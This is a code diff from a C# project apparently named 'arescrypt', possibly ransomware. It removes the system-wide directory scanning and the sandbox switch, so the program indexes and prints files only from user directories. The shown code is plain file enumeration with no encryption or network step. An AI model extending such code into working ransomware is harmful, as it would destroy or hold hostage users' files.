@@ -25,7 +25,6 @@ namespace arescrypt
             // End welcome message
 
             var userSpecificDirs = new List<string> { "" };
-            var systemSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
 
 
@@ -52,15 +51,7 @@ namespace arescrypt
             foreach (string dir in userSpecificDirs)
                 foreach (string file in FileHandler.DirSearch(dir))
                     userSpecificFiles.Add(file);
-            if (config.sandBox) // == true
-                fullFileIndex = userSpecificFiles.ToArray();
-            else if (!config.sandBox) // == false
-            {   // Get file index from both Lists' and spawn a Full File Index of all files in every subdirectory
-                foreach (string dir in systemSpecificDirs)
-                    foreach (string file in FileHandler.DirSearch(dir))
-                        systemSpecificFiles.Add(file);
-                fullFileIndex = Misc.concatList(userSpecificFiles, systemSpecificFiles).ToArray();
-            }
+            fullFileIndex = userSpecificFiles.ToArray();
 
             // Print out all discovered files.
             foreach (string file in fullFileIndex)
